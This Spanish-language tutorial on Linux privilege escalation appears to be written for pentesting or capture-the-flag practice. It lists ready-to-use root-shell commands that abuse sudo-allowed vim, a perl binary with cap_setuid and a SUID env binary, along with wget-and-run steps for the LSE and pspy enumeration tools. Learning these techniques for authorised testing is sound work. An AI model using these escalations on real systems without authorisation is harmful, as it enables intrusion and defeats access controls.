# Escalada de Privilegios

Primero, verifiquemos la versión de Linux con el siguiente comando:

```shell
lsb_release -a
```

## Escalada de Privilegios usando sudo -l
Ejecutamos el siguiente comando para verificar qué archivos podemos ejecutar como root:

```shell
sudo -l
```

Desde allí, podemos buscar la carpeta y el exploit que utiliza para establecer una reverse shell.

### Ejemplo 
Si encontramos que podemos ejecutar `/usr/bin/vim` como root, podemos usarlo para escalar privilegios:

```shell
sudo /usr/bin/vim -c ':!/bin/sh'
```

## Escalada Básica de Privilegios usando CAPABILITIES

```shell
getcap -r / 2>/dev/null
```

Esto lista los paquetes o servicios que podemos ejecutar como root.

```shell 
#Ejemplo
/usr/bin/perl = cap_setuid+ep
```

### Ejemplo
Si encontramos que `/usr/bin/perl` tiene `cap_setuid+ep`, podemos usarlo para obtener una shell como root:

```shell
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## Escalada de Privilegios usando Binarios

Buscamos archivos que podemos ejecutar como root con el usuario actual:

```shell
find / -perm -4000 2>/dev/null
```

Consultamos el binario en GTFobins y buscamos cualquier binario que podamos ejecutar con permisos SUID. El exploit necesita usar la ruta completa.

```shell
/usr/bin/env /bin/sh -p
```

### Ejemplo 
Si encontramos que `/usr/bin/env` tiene permisos SUID, podemos usarlo para obtener una shell privilegiada como se muestra arriba.

## Herramientas

### LSE (Linux Smart Enumeration): 
LSE es una herramienta de enumeración para sistemas Linux que permite a los atacantes obtener información detallada sobre la configuración del sistema, servicios en ejecución y permisos de archivos. LSE utiliza una variedad de comandos de Linux para recopilar información y presentarla en un formato fácil de entender. Usando LSE, los atacantes pueden detectar vulnerabilidades potenciales y encontrar información valiosa para futuros ataques.

**Ejemplo Ético:**
```shell
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1
```

### Pspy: 
Pspy es una herramienta de enumeración de procesos que permite a los atacantes observar procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares. Pspy es útil para detectar malware y puertas traseras, así como para identificar procesos maliciosos que se ejecutan en segundo plano sin interacción del usuario.

**Ejemplo Ético:**
```shell
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

Herramienta LSE: https://github.com/diego-treitos/linux-smart-enumeration  
Herramienta PSPY: https://github.com/DominicBreuker/pspy